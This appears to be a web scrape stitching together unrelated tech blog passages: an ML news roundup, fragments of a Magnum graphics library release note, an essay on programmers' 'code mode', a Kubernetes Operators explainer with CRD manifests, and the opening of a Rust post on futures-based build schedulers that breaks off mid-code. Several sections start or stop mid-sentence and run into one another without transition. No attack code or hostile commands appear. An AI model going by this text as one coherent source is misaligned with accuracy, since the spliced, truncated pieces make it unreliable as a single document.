<h2>6. <a href="https://hanlab.mit.edu/projects/ofa/" target="_blank" rel="nofollow">One neural network to rule them all!</a></h2>
<p>(not really, just a really cool way to train a single neural network and have it be optimised for multiple device types).</p>
<p>This is actually a really important piece of research.</p>
<p>Usually, to have the same machine learning model deployed across multiple device types (think smartphone, desktop PC and microcontroller), you'd need to train a separate model for each one.</p>
<p>This practice of training a separate machine learning model for each device type, especially when they're all learning similar things, turns out to be incredibly wasteful (perhaps surprisingly, computing power doesn't magically grow on trees, it burns carbon and releases emission).</p>
<p>Not anymore. The <a href="https://ofa.mit.edu/" target="_blank" rel="nofollow">once for all network (codenamed OFA)</a> is a training paradigm which allows you to train a neural network once and have it automatically adapt itself (during training) for different devices.</p>
<p>The explanation the researchers give is worth reading itself, let alone the outstanding work they've created.</p>
<h2>7.  <a href="https://explained.ai/matrix-calculus/index.html" target="_blank" rel="nofollow">All of the matrix calculus you need for deep learning</a></h2>
<p>Jeremy Howard (the creator of fast.ai) decided he needed to know more about the matrix calculus which works under the hood of deep learning.</p>
<p>So he and his colleague Terence Parr wrote a book about it.</p>
<p>That's the trick. If you want to know something about something, write a book about it.</p>
<p>And if you want to brush up your matrix calculus (and your deep learning from scratch skills), <a href="https://explained.ai/matrix-calculus/index.html" target="_blank" rel="nofollow">The Matrix Calculus You Need For Deep Learning book</a> is for you.</p>
<h2>8. <a href="https://www.aicrowd.com/challenges/neurips-2020-minerl-challenge" target="_blank" rel="nofollow">Can AI play Minecraft?</a></h2>
<p>A new challenge has kicked off on AI Crowd. The goal? Teach an AI system to find a diamond in Minecraft.</p>
<p>Now, you see, I've never played Minecraft and never intend to. But this kind of challenge excites me.</p>
<p>If you want to get hands-on with a reinforcement learning project (if you do well, you'll probably be ripe for a job at OpenAI or DeepMind), check out the <a href="https://minerl.io/competition/" target="_blank" rel="nofollow">2020 MineRL challenge</a>.</p>
<h2>9. <a href="https://medium.com/@alexeyab84/yolov4-the-most-accurate-real-time-neural-network-on-ms-coco-dataset-73adfd3602fe" target="_blank" rel="nofollow">YOLOV4</a> — The state of the art real-time object detection model, You Only Look Once, is back (for a 4th time)</h2>
<p>If you ever want to announce that you're launching a state of the art machine learning algorithm, <a href="https://medium.com/@alexeyab84/yolov4-the-most-accurate-real-time-neural-network-on-ms-coco-dataset-73adfd3602fe" target="_blank" rel="nofollow">Aleksey Bochkovskiy's Medium article</a> should be your reference point.</p>
<p>The first paragraph says enough.</p>
<p>"Darket YOLOv4 is faster and more accurate than real-time neural networks Google TensorFlow EfficientDet and FaceBook Pytorch/Detectron RetinaNet/MaskRCNN on Microsoft COCO dataset."</p>
<p>This just goes to show, determined, small-group researchers can take on the likes of Google and Facebook.</p>
<h2>10. <a href="https://ai.facebook.com/blog/end-to-end-object-detection-with-transformers" target="_blank" rel="nofollow">End-to-end object detection with Transformers</a></h2>
<p>Speaking of object detection, Facebook just did it with a new style (well, a different model than what's usually used).</p>
<p>Transformers (a machine learning architecture) have been breaking all kinds of records in the NLP (natural language processing) space over the past year. Now they're making their way into computer vision.</p>
<p><a href="https://ai.facebook.com/blog/end-to-end-object-detection-with-transformers" target="_blank" rel="nofollow">DETR (short for detection transformer) is a transformer-based object …</a></p></div></div>

short­com­ings of <a href="https://en.cppreference.com/w/cpp/container/vector">std::vec­tor</a>, es­pe­cial­ly when it comes to cus­tom
al­lo­ca­tors. The im­ple­men­ta­tion present in 2020.06 is still miss­ing ar­bi­trary
in­ser­tion and dele­tion which is why it’s not ad­ver­tised in more de­tail yet —
once that’s done, ex­pect a ded­i­cat­ed ar­ti­cle to­geth­er with bench­marks and
com­par­i­son to com­mon im­ple­men­ta­tions. Un­til then, see
<a href="https://doc.magnum.graphics/corrade/classCorrade_1_1Containers_1_1Array.html#Containers-Array-growable">Grow­able ar­rays</a> for an in­tro­duc­tion.</p>
<p>One of the last re­main­ing pieces of STL that are <span>hold­ing us back</span> not as
light­weight &amp; flex­i­ble as I’d want them to be are <a href="https://en.cppreference.com/w/cpp/string/basic_string">std::string</a>s. Af­ter
the re­lease cut I de­cid­ed that new APIs are not go­ing to use those any­more,
which means a re­place­ment is un­der­way. Ex­ist­ing APIs will get grad­u­al­ly port­ed
away, sim­i­lar­ly as was done with <a href="https://en.cppreference.com/w/cpp/container/vector">std::vec­tor</a> or <a href="https://en.cppreference.com/w/cpp/memory/unique_ptr">std::unique_p­tr</a>
in the past. Of course, as al­ways, an <em>opt-in</em> com­pat­i­bil­i­ty of the new APIs
with <a href="https://en.cppreference.com/w/cpp/string/basic_string">std::string</a> / <a href="https://en.cppreference.com/w/cpp/string/basic_string_view">std::string_view</a> will be pro­vid­ed — the goal
is not to alien­ate users of stan­dard C++, the goal is to be flex­i­ble and
pro­vide al­ter­na­tives.</p>

<h2><a href="#what-s-new-in-plugins">What’s new in plug­ins</a></h2>
<p>The more Mag­num gets used to im­port a in­creas­ing­ly broad range of datasets in
var­i­ous for­mats, the more pre­vi­ous­ly un­han­dled cor­ner cas­es get dis­cov­ered and
fixed.</p>
<ul>
<li>The <a href="https://doc.magnum.graphics/magnum/classMagnum_1_1Trade_1_1AssimpImporter.html">As­simpIm­porter</a> now cor­rect­ly im­ports
mul­ti-prim­i­tive mesh­es, pre­serves al­pha in ma­te­ri­als and ac­counts for Y up
/ Z up ori­en­ta­tion over­ride, if a file de­fines it.</li>
<li>All im­porters now im­port both base col­or and tex­ture in­stead of ei­ther one
or the oth­er. In­ter­est­ing­ly, this was a lim­i­ta­tion that orig­i­nat­ed from the
COL­LA­DA for­mat — the ear­ly <a href="https://doc.magnum.graphics/magnum/namespaceMagnum_1_1Trade.html">Trade</a> APIs and the now-gone
<code>ColladaImporter</code> plug­in were mod­elled af­ter it, how­ev­er when re­view­ing
this de­sign de­ci­sion it turned out that COL­LA­DA is ac­tu­al­ly the on­ly for­mat
with such re­stric­tion and ev­ery oth­er for­mat (OBJ, glTF, OpenGEX, …)
sup­ports com­bin­ing both.</li>
<li><a href="https://doc.magnum.graphics/magnum/classMagnum_1_1Trade_1_1TinyGltfImporter.html">TinyGlt­fIm­porter</a> failed to im­port
in­ter­leaved mesh­es. This was a short­cut done to make the ear­ly
im­ple­men­ta­tion sim­pler. To my sur­prise, ap­par­ent­ly the vast ma­jor­i­ty of
glTF mod­els is ex­port­ed de-in­ter­leaved and thus in­ef­fi­cient for the GPU,
which ex­plains why this lim­i­ta­tion went large­ly un­no­ticed since the
orig­i­nal plug­in re­lease in 2018.</li>
</ul>
<p>Im­age im­porters weren’t left be­hind ei­ther — for­mats that sup­port it such as
DDS or Ba­sis Uni­ver­sal now can im­port par­tic­u­lar mip lev­els us­ing
<a href="https://doc.magnum.graphics/magnum/classMagnum_1_1Trade_1_1AbstractImporter.html#a9624991f2d46d5da6ec17e1c84d620aa">Trade::Ab­strac­tIm­porter::im­age2DLev­el­Count()</a> and the sec­ond pa­ram­e­ter of

you about longer-run­ning op­er­a­tions or pro­cess­ing stats. It’s prob­a­bly most
help­ful in case of As­simp, which likes to crash or mis­be­have on cer­tain files.</p>

    <h2>Code Mode</h2>

<p>It's been a wild week. You and your team have been engaged in an all-out war with the codebase for the past two spints. There's this new integration with a partner that's close to being shipped, and it promises bountiful revenue and voluminous web traffic. And you've been working on the part of it that'll seal the deal and let your squad deploy, come Monday morning.</p>

<p>You find yourself on the Friday night before launch, 6pm, absolutely fried at your desk. Everyone else on your team already left to attend the company happy hour, or has gone home seeking sanity from work. For the past several hours, you've been tracking down a nasty, horrendous bug that could prevent the feature from shipping next week.</p>

<p>But you introduced it.</p>

<p>Caught late in the game, with the marketing team eager to deploy, there were no other options. Thankfully, you're close to patching things up. Your thoughts have been a web of abstractions all night, looking something like this:</p>

<ul>
<li>I've looked at <code>SuperClass</code>, but the stack trace is from <code>ChildClass</code>.</li>
<li>Alright, so <code>ChildClass</code> imports the function from <code>HelperModule</code>...</li>
<li><code>HelperModule</code> uses a bunch of functions from <code>CrazyLibrary</code>. Let's do a search. Great, <code>CrazyLibrary</code> has no documentation.</li>
<li>Wait, did I check out the latest <code>master</code> yet?</li>
<li>Oh wait, the error wasn't actually on the server. Let's look at the client.</li>
<li><code>HugeReactComponent</code> is making the call. Maybe the <code>type</code> is wrong?</li>
<li>Oh man, it uses <code>DatabaseModernClientApi</code>... I don't know <code>DatabaseModernClientApi</code>.</li>
<li>Wait no, it's in <code>MiddlewareClientServer</code>...</li>
</ul>

<p><img src="https://miro.medium.com/max/2560/0*UxR4_Op7AExQz-Oo.png"></p>

<p>At 7:30pm, you're sure you've nailed it. It was a silly conditional that got in the way. Boom, problem solved. After merging a PR that switched the broken ternary statement around, off to the happy hour you go.</p>

<p>Beaming with pride from merging the bug fix, you walk in, and notice your team chatting with folks from a sister team. You recognize some members of the sister team, but not everyone. You go and try to introduce yourself.</p>

<blockquote>
<p>"Hey y'all, what's happening?!"</p>
</blockquote>

<p>Both your team and the sister team sheepishly smile at you. "Hey man", one of them says, "long day?" You look around, and suddenly notice that some people have startled looks on their faces. Then you realize they had been having a low-key conversation, and that you'd jumped into the conversation at quite the high decibel.</p>

<blockquote>
<p>"Yeah, haha", you play it off, "Oh boy, working on the <code>PartnerIntegrationProject</code> this week was awful! Whoever wrote <code>SuperClass</code> created a complete mess. Must've taken 10 hours away from my life."</p>
</blockquote>

<p>Everyone in the circle stops smiling. Eric, who wrote that class, nervously chuckles. "Yeah, I guess it could be better, huh?" Oops. Bad move. You feel the energy drain out of the conversation they were having.</p>

<p>You stay silent for the next half hour or so, and everyone keeps chatting, but it <em>feels</em> weird. You keep noticing people's expressions and body language. There's some more forced conversation before a few folks excuse themselves. Then everyone disperses.</p>

<p>And for the rest of the evening, you can't shake off the feeling that everyone's thinking something about you. That you did something wrong. You get a sense that the energy was off, and blame yourself.</p>

<p>But you're not to blame! Everything was probably fine, and no one was judging you. You were just in <strong>code mode</strong>.</p>

<h2>What Happens In Your Brain When You Program?</h2>

<p>Ask any developer, and "code mode" is a real thing. We seem to be so drawn into our innermost thoughts of <code>classes</code>, <code>modules</code>, <code>syntax</code>, and <code>systems</code>-- that we lose track of how to mentally function the rest of the time. Some call it "monkey mind" or restlessness, but we all recognize it. It's the brain on hyperdrive, going 200 miles per hour when the speed limit's about 50.</p>

<p>It's the thinking, or rather, <em>the overthinking</em>, that is almost always unnecessary. And for reasons unbeknownst, this always tends to happen when we need to deal with other people.</p>

<p><img src="https://i.imgur.com/95NZpPy.png"></p>

<p>Now, that doesn't seem problematic, right? Being stuck in code mode is harmless. So you overthink the occasional small talk session, and can't really pay attention to long films, but is it really harmful?</p>

<p>No, not really. But understanding why it happens helps us understand how to make the gear switch a little bit smoother, which is behind my upcoming pitch for meditation. If you're able to leave the programmatic thought patterns behind anytime you'd like, you have greater control over your life.</p>

<p>Of course, we want to be sure of our assumptions. After all, the argument for meditation requires a somewhat well-formed paradigm of what's happening when we read and write code. It's important to take into account exactly which thought patterns we "execute" <strong>while</strong> in code mode.</p>

<h2>What's Going On Up There?</h2>

<p>There was a push in recent years to allow programming to replace the study of a foreign language. Around that time, <a href="https://par.nsf.gov/servlets/purl/10085745%20conducted%20a%20study%20that%20observed%2017%20participants%20in%20an%20fMRI%20scanner" rel="nofollow" target="_blank">Norman Peitek, Janet Siegmund, and a team of researchers</a> while they were comprehending short source-code snippets. Their key finding was that despite the stereotype of math and logic being the major concern in programming, the brains of the participants showed greater activation of its language centers than expected.</p>

<p>Now, this may be confusing to you, as it seemingly contradicts <em>the idea of code mode</em>. After all, if the language centers are activated, shouldn't we, as social beings who communicate through the use of language, not be affected by these lingering cognitive thought patterns?</p>

<p>This could be so. But if we dig deeper into the results of the sudy, we actually find that the programmer mind is activated more traditionally than the above finding would suggest:</p>

<blockquote>
<p>In essence, we found five relevant activation clusters, all in the left hemisphere.</p>
</blockquote>

<p>The function of the left hemisphere is thought to be for control of the right side of the body, and "is the more academic and logical side of the brain". The right hemisphere is associated with creativity, visual/spatial perception, and emotional management and expression.</p>

<p>Because this <a href="https://now.northropgrumman.com/the-left-brain-right-brain-myth-is-it-true/" rel="nofollow" target="_blank">has been disputed recently</a>, I took a look at what naysayers of the "left-brain, right-brain myth" were saying. It turns out, most of the rejection of this "myth" stems from the fact that <em>people are not usually left-brain or right-brain dominant</em>. However, the fact of the matter is, the left hemisphere is <strong>still associated</strong> with logical operations and analytical functions, and the right with more "emotional" or "creative" activities.</p>

<blockquote>
<p>In fact, a 2013 University of Utah study on brain lateralization examined the brains of more than 1,000 people and found no evidence for people having a dominant side of the brain. <em>Even though each side of the brain does more work for certain functions</em>, such as language being localized on the left and attention on the right, this doesn’t vary by person. All of the study participants, whether they were engineers or musicians, used their entire brain equally, debunking the left-brain right-brain myth.</p>
</blockquote>

<p>In addition to programming being left hemisphere dominant, there's also a lot going on. The earlier study referenced found that the activated regions while coding found were:</p>

<ol>
<li>Middle frontal gyrus (division of attention, silent word reading, verbal/numeric problem solving)</li>
<li>Middle temporal gyrus (categorization)</li>
<li>Inferior parietal lobule (verbal/numeric problem solving)</li>
<li>Inferior frontal gyrus (verbal/numeric)</li>
<li>Inferior frontal gyrus (silent word reading, problem solving)</li>
</ol>

<p>If this sounds like a surprisingly high amount of brain activity merely for <em>understanding source code</em>, I would agree. And if it sounds like you'd be surprised if all this happened when trying to sleep or talking to a friend, you'd probably be right. Thus, I'd argue that one should choose to believe that quite a bit is going in mentally when we program, and mostly in the left hemisphere.</p>

<h2>But Isn't It Fun?</h2>

<p>An interesting note to add is that this kind of intensive brain activity sounds painful in a challenging way, but is actually desirable. Many call it the "flow" state. Courtland Allen and Vincent Woo <a href="https://www.indiehackers.com/podcast/041-vincent-woo-of-coderpad" rel="nofollow" target="_blank">talked about it in their interview on IndieHackers</a>:</p>

<p>Courtland says:</p>

<blockquote>
<p>That's funny because it reminds me of the first two years after I moved to San Francisco. I started a startup and I basically just coded for sixteen hours a day, every day for two years, and the problem is that if you're in flow for that long and you don't vary your activities... you don't make new memories, everything just blurs together, so I have a two year block of time in my life where there were zero memories, and I swore that I would never do that again.</p>
</blockquote>

<p>To which Vincent replies:</p>

<blockquote>
<p>That's kind of what I suspected happened to that sixty year old plus guy at Amazon, I think he just sat down to code one day and then he woke up, and he was sixty. I don't know, I think flow is both really seductive and also kind of boring in it's own way.</p>
</blockquote>

<p>A fascinating take-away of the above conversation is the conflation of two different ideas: <code>flow</code> state and <code>code mode</code>. From our good friend, <a href="https://en.wikipedia.org/wiki/Flow_(psychology)" rel="nofollow" target="_blank">Wikipedia</a>:</p>

<blockquote>
<p>In positive psychology, a flow state, also known colloquially as being in the zone, is the mental state in which a person performing an activity is fully immersed in a feeling of energized focus, full involvement, and enjoyment in the process of the activity.</p>
</blockquote>

<p>Here, I argue this point, and I want to be succint: <code>flow</code> and <code>code mode</code> appear to be two sides of the same coin. That specific coin is neurotransmitter-fueled activity, causing us to hone in one problem (or consecutive problems) for an indefinite period of time. However, we generally use the term <code>flow</code> to refer to the good parts of it, and I'm using <code>code mode</code> as the detrimental aspect.</p>

<p>I think we'd all agree that <a href="https://algodaily.com/lessons/solving-the-health-problems-of-software-engineers" rel="nofollow" target="_blank">16 hours spent on something is not good for your health</a>, mentally or physically. Especially <a href="https://www.amazon.com/gp/product/0321751043/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=algodaily03-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0321751043&amp;linkId=6fb078bf069b7f8eb648902d5923ab87" rel="nofollow" target="_blank">the art of programming</a>-- your back aches, your eyes burn, and you leave the coding session feeling unsatisfied. This is what we want to avoid, and the mental fatigue this imparts on you will carry over to other parts of life.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Have you ever wondered how effective Site Reliability Engineering (SRE) teams manage complex applications successfully? In the Kubernetes ecosystem, there is only one answer: Kubernetes Operators! In this article, we will examine both what they are and how they work.</p><div><p>The Kubernetes Operator concept was developed by engineers at CoreOS in 2016 as an advanced and native way of building and driving every application on the Kubernetes cluster, which needs domain-specific knowledge. It provides a consistent approach to handle all application operational processes automatically, without any human reaction via close cooperation with the Kubernetes API. In other words, an operator is a way of packaging, running, and managing Kubernetes applications.</p><p>The Kubernetes Operator pattern acts in accordance with one of the core Kubernetes principles: <a href="https://en.wikipedia.org/wiki/Control_theory">the control theory</a>. In robotics and automation, it is a mechanism that continuously operates dynamical systems. It relies on an ability to quickly tailor the workload demand to the available resources as accurately as possible. The objective is to develop a control model with the necessary logic to help an application or system remain stable. In Kubernetes world, that part is handled by controllers.</p><p>A controller is a special software that, in the loop, responds to changes and performs adaptation actions in the cluster. The first Kubernetes controller was a kube-controller-manager. It is regarded as an ancestor for all operators, which were built later.</p><h2 id="what-is-a-controller-loop">What Is a Controller Loop?</h2><p>To put it simply, controller loops are the base of controller actions. Imagine there is a non-terminating process (called a reconciliation loop, in Kubernetes) happening over and over again, as in the following illustration:</p><a href="#kubernetes-operators-reconciliation-loop.png" onclick="LazyLoadImg()"><figure><img src="https://d33wubrfki0l68.cloudfront.net/3d59e9e2da748992dd14e5abc92073ef7cbcbee9/9f266/img/blog/kubernetes-operators-reconciliation-loop_hu9f7037ecd3cc7a82b7d5e74d6b2b9715_20290_564x0_resize_box_2.png" data-src="https://d33wubrfki0l68.cloudfront.net/3d59e9e2da748992dd14e5abc92073ef7cbcbee9/9f266/img/blog/kubernetes-operators-reconciliation-loop_hu9f7037ecd3cc7a82b7d5e74d6b2b9715_20290_564x0_resize_box_2.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><a href="#_" id="kubernetes-operators-reconciliation-loop.png"><figure><img src="" data-src="https://d33wubrfki0l68.cloudfront.net/4d00a0df53a752d79d89dbdf5f9da2b36f5167b3/b8cdc/img/blog/kubernetes-operators-reconciliation-loop.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><p>This process observes at least one Kubernetes <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/kubernetes-objects/#kubernetes-objects">object</a>, which contains information about the desired state. Objects such as …</p><ul><li>Deployments,</li><li>Services,</li><li>Secrets,</li><li>Ingress,</li><li>Config Maps,</li></ul><p>… are defined by configuration files made up of manifests in JSON or YAML. Then the controller(s) makes a continuous adjustment via Kubernetes API to imitate the desired state until the current state becomes the desired state, according to the built-in logic.</p><p>In that way, Kubernetes deals with the dynamic nature of Cloud Native systems, by handling a constant change. Examples of modifications perform to achieve expected state include:</p><ul><li>Noticing when nodes go down and demanding a new one.</li><li>Checking if pods need to be replicated.</li><li>Creating a new load-balancer, if requested.</li></ul><h2 id="how-does-a-kubernetes-operator-work">How Does a Kubernetes Operator Work?</h2><p>An operator is an application-specific controller. It extends a Kubernetes API to create, configure, and manage complex applications on behalf of humans (operation engineers or site reliability engineers). Let’s see what Kubernetes documentation says about it.</p><blockquote><p><em>Operators are software extensions to Kubernetes that make use of custom resources to manage applications and their components. Operators follow Kubernetes principles, notably the control loop.</em> - <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/operator/">Kubernetes Documentation</a></p></blockquote><p>So far, you know that operators take advantage of controllers that observe Kubernetes objects. These controllers are a bit different because they are tracing custom objects, often called custom resources (CR). CR is an extension of the Kubernetes API that provides a place where you can store and retrieve structured data—the desired state of your application. The whole principle of operation is presented in the diagram below.</p><a href="#kubernetes-operators-controller-loop.png" onclick="LazyLoadImg()"><figure><img src="https://d33wubrfki0l68.cloudfront.net/421570f988ea30fb53902d4533e0b8de6911d7b7/fa9db/img/blog/kubernetes-operators-controller-loop_hu9fe4ce2832296e1fe8a815e4eca60fda_43276_784x0_resize_box_2.png" data-src="https://d33wubrfki0l68.cloudfront.net/421570f988ea30fb53902d4533e0b8de6911d7b7/fa9db/img/blog/kubernetes-operators-controller-loop_hu9fe4ce2832296e1fe8a815e4eca60fda_43276_784x0_resize_box_2.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><a href="#_" id="kubernetes-operators-controller-loop.png"><figure><img src="" data-src="https://d33wubrfki0l68.cloudfront.net/63c39aec0db28d70ff470c5aec042c5301b8bc3e/93486/img/blog/kubernetes-operators-controller-loop.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><p>The Operator continuously tracks cluster events relating to a specific type of custom resource. The types of events on these custom resources that can be tracked are:</p><ul><li>Add,</li><li>Update,</li><li>Delete.</li></ul><p>When the operator receives any information, it will take action to adjust the Kubernetes cluster or external system to the desired state as part of its reconciliation loop in the custom controller.</p><h2 id="how-to-add-a-custom-resource">How to add a custom resource?</h2><p>A custom resource extends Kubernetes capabilities by adding new kinds of objects that can be helpful for your application. Kubernetes provides two ways to add custom resources to clusters:</p><ul><li><strong>via API Aggregation</strong>, an advanced method that requires you to build your own API Server, but will give you more control</li><li><strong>via Custom Resource Definitions (CRD)</strong>, a simple way that can be created without any programming knowledge, as an extension to the original Kubernetes API server.</li></ul><p>These two options meet the needs of different users, who can choose between flexibility and ease of use. The Kubernetes community created a <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#choosing-a-method-for-adding-custom-resources">comparison</a> that will help you decide what method is right for you, but the most popular choice is CRD.</p><h3 id="custom-resource-definitions">Custom Resource Definitions</h3><p>Custom Resource Definitions have been around for quite some time now; the first major API specification was released with Kubernetes 1.16.0. The manifest below presents an example:</p><div><pre><code data-lang="yaml"><span>apiVersion</span>: apiextensions.k8s.io/v1beta1
<span>kind</span>: CustomResourceDefinition
<span>metadata</span>:
  <span>name</span>: application.stable.example.com
<span>spec</span>:
  <span>group</span>: stable.example.com
  <span>version</span>: v1
  <span>scope</span>: Namespaced
  <span>names</span>:
    <span>plural</span>: application
    <span>singular</span>: applications
    <span>kind</span>: Application
    <span>shortNames</span>:
      - app
</code></pre></div><p>This CRD will allow you to create a CR called <em>Application</em>. (We are going to use it in the next section.) The first two lines define what <code>apiVersion apiextensions.k8s.io/v1beta1</code> of object kind <code>CustomResourceDefinition</code> you want to create.</p><p>The metadata describes the name of the resource, but the most important place here is the field <em>spec</em>. It lets you specify the group and version and the scope of visibility - namespaced or cluster-wide.</p><p>Afterwards, you define names in multiple formats and create a handy short name, which lets you perform a command <code>kubectl get app</code> to get the existing CR.</p><h3 id="custom-resource">Custom Resource</h3><p>The CRD above allows you to create the following manifest of a custom resource.</p><div><pre><code data-lang="yaml"><span>apiVersion</span>: stable.example.com/v1
<span>kind</span>: Application
<span>metadata</span>:
  <span>name</span>: application-config
<span>spec</span>:
  <span>image</span>: container-registry-image:v1<span>.0.0</span>
  <span>domain</span>: teamx.yoursaas.io
  <span>plan</span>: premium
</code></pre></div><p>As you can see, we can contain here all the necessary information required to run an application for a specific case. This custom resource will be observed by our operator - to be precise, by the operator’s custom controller. According to the built-in logic in the controller, the necessary actions will imitate the desired state. It can create a Deployment, Service, and necessary ConfigMaps for our application. Run it and expose it via ingress on a specific domain. This is just an example of a use case, but it can do whatever is designed.</p><p>Operators can also be used to provision resources that live outside Kubernetes. You can control the provisioning of external routers or create a database in the cloud without leaving the Kubernetes platform.</p><h2 id="kubernetes-operators-a-case-study">Kubernetes Operators: a Case Study</h2><p>To have a whole clear picture of Kubernetes Operators, let’s examine a <a href="https://github.com/coreos/prometheus-operator">Prometheus Operator</a>, one of the first and most popular operators. It simplifies the deployment and configuration of Prometheus, Alertmanager, and related monitoring components.</p><p>The core feature of the Prometheus Operator is to monitor the Kubernetes API server for changes to specific objects and ensure that the current Prometheus deployments match these objects. The Operator acts on the following Custom Resource Definitions (CRDs):</p><ul><li><strong>Prometheus</strong>, which defines a desired Prometheus deployment.</li><li><strong>Alertmanager</strong>, which defines a desired Alertmanager deployment.</li><li><strong>ServiceMonitor</strong>, which declaratively specifies how groups of Kubernetes services should be monitored. The Operator automatically generates Prometheus scrape configuration based on the current state of the objects in the API server.</li><li><strong>PodMonitor</strong>, which declaratively specifies how a group of pods should be monitored. The Operator automatically generates Prometheus scrape configuration based on the current state of the objects in the API server.</li><li><strong>PrometheusRule</strong>, which defines a desired set of Prometheus alerting and/or recording rules. The Operator generates a rule file, which can be used by Prometheus instances.</li></ul><p>The Prometheus Operator automatically detects changes in the Kubernetes API server to any of the above objects, and ensures that matching deployments and configurations are kept in sync.</p><h2 id="need-more">Need more?</h2><p>If you would like to hear more about how to extend Kubernetes, take a look at this talk from one of my Container Solutions colleagues, Adam Otto, from <a href="https://cloudnativewarsaw.com/">Cloud Native Warsaw Conference</a>.</p><p><iframe width="560" height="315" src="https://www.youtube.com/embed/8QoCL1NCVv4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p><hr><p>The article has been originally published on the <a href="https://blog.container-solutions.com/kubernetes-operators-explained">Container Solutions</a> blog.</p></div></div>]]>

<p>This is another blog post related to the <a href="https://www.microsoft.com/en-us/research/publication/build-systems-la-carte/">Build Systems à la Carte</a> paper. See <a href="https://nikhilism.com/post/2020/type-classes-build-systems/">Using type-classes to model the expressivity of build systems</a> for the first one.</p>

<p>The paper proposes splitting build systems into two components:</p>

<ol>
<li><strong>Rebuilders</strong> decide when to rebuild a particular key (file).</li>
<li><strong>Schedulers</strong> decide <em>how</em> to rebuild multiple keys - handling dependencies while maintaining correctness and efficiency.</li>
</ol>

<p>Schedulers come in 3 flavors (see Section 4):</p>

<ol>
<li><strong>Topological</strong> use a simple topological sort to determine the order of building keys. They are limited to static dependencies - if new dependencies are discovered during the build process, they cannot be correctly added to the build graph.</li>
<li><strong>Restarting</strong> schedulers start building a particular key, then, as dependencies are discovered, abort building that key. Then the discovered dependency(ies) are built, after which the original key’s task is restarted. This allows dynamic dependencies, but at the cost of repeating parts of the build process.</li>
<li><strong>Suspending</strong> schedulers also start building a particular key. When a dependency is discovered, instead of aborting the current task, they suspend it, go and build the dependency, then resume the task. This allows dynamic dependencies without repeating work.</li>
</ol>

<p>Section 4.3 says:</p>

<blockquote>
<p>This scheduler (when combined with a suitable rebuilder) provides a minimal
build system that supports dynamic dependencies. In our model, a suspending
scheduler is easy to write – it makes a function call to compute each
dependency. However, a more practical implementation is likely to build
multiple dependencies in parallel, which then requires a more explicit task
suspension and resumption. To implement suspension, there are two standard
approaches:</p>

<ul>
<li><p>Blocking threads or processes: this approach is relatively easy, but can
require significant resources, especially if a large number of tasks are
suspended. In languages with cheap green threads (e.g. Haskell), the
approach is more feasible and it was the original approach taken by SHAKE.</p></li>

<li><p>Continuation-passing style (Claessen, 1999) can allow the remainder of a
task to be captured, paused, and resumed later. Continuation passing is
efficient, but requires the build script to be architected to allow
capturing continuations. SHAKE currently uses this approach.</p></li>
</ul>

<p>While a suspending scheduler is theoretically optimal, in practice, it is
better than a restarting scheduler only if the cost of avoided duplicate work
outweighs the cost of suspending tasks. Note, furthermore, that the cost of
duplicate work may often be just a fraction of the overall build cost.</p>
</blockquote>

<p>I want to show that an implementation of such a scheduler is “trivially”
possible using Futures (Promises for JS folks) and provides the nice property
of automatically giving parallelism, without any need for explicit suspension
and resumption. We do not need to perform any transformations to code. Instead
almost everything is written in a very imperative, blocking style, with
async/await handling the suspension mechanics. Using futures means that we
do not need a thread/process per active task. Since builds are generally I/O
bound and more importantly, running separate processes than the build process,
this means we can even get away with just one actual OS thread running all
currently active futures.</p>

<p>With a “sophisticated” (I don’t know a better word) futures implementation such
as in Rust, you can even make reasonable claims about the memory usage and
allocation patterns of such an implementation, which can help you answer
whether “the cost of avoided duplicate work outweighs the cost of suspending
tasks”.</p>



<p>I am going to focus on a “build system” that has these requirements:</p>

<ol>
<li><p>It is going to launch arbitrary external processes. This generally makes the
cost of suspending pretty small compared to the cost of restarting.</p></li>

<li><p>We want parallelism because this is 2020. At the same time, we want to bound
this parallelism to avoid overloading a machine.</p></li>
</ol>

<p>Just like in a real build system, our tasks can:</p>

<ol>
<li>Depend on N tasks, and cannot begin until all N of those tasks are done. The
code does assume all tasks always succeed, which is not true in reality.</li>
<li>Share common dependencies, so that multiple tasks should be able to block on
a single task.</li>
</ol>

<blockquote>
<p>The examples below use
<a href="https://tokio.rs/docs/getting-started/hello-world/">tokio</a> and
<a href="https://docs.rs/futures/0.3.5/futures/index.html">futures</a> to implement the
runtime and various useful features. They will only run on UNIX since they use a shell.</p>
</blockquote>

<h2 id="simple-suspension">Simple suspension</h2>

<p><a href="https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=85cde96a0bbd4d3f26b5eceea490e338">Full code in the Rust playground</a></p>

<p>Let’s start small. This one just demonstrates setting up dependencies so that a task waits until they are all done.</p>

<p>First we have a wall of imports, most of which we will only use later.</p>

<div><pre><code data-lang="rust"><span>#![allow(unused_imports)]</span><span>
</span><span>
</span><span></span><span>use</span><span> </span>futures::future::join_all;<span>
</span><span></span><span>use</span><span> </span>futures::future::FutureExt;<span>
</span><span></span><span>use</span><span> </span>futures::stream::FuturesUnordered;<span>
</span><span></span><span>use</span><span> </span>futures::stream::StreamExt;<span>
</span><span></span><span>use</span><span> </span>std::rc::Rc;<span>
</span><span></span><span>use</span><span> </span>tokio::process::Command;<span>
</span><span></span><span>use</span><span> </span>tokio::runtime::Builder;<span>
</span><span></span><span>use</span><span> </span>tokio::sync::Semaphore;<span>
</span></code></pre></div>

<p>Then, a couple of utility functions to create a command and to actually start the process and obtain a future to monitor when the process is done.</p>

<div><pre><code data-lang="rust"><span>fn</span> <span>command</span><span>&lt;</span>S: <span>Into</span><span>&lt;</span><span>String</span><span>&gt;&gt;</span>(cmdstr: <span>S</span>)<span> </span>-&gt; <span>Command</span><span> </span>{<span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span>cmd<span> </span><span>=</span><span> </span>Command::new(<span>"/bin/sh"</span>);<span>

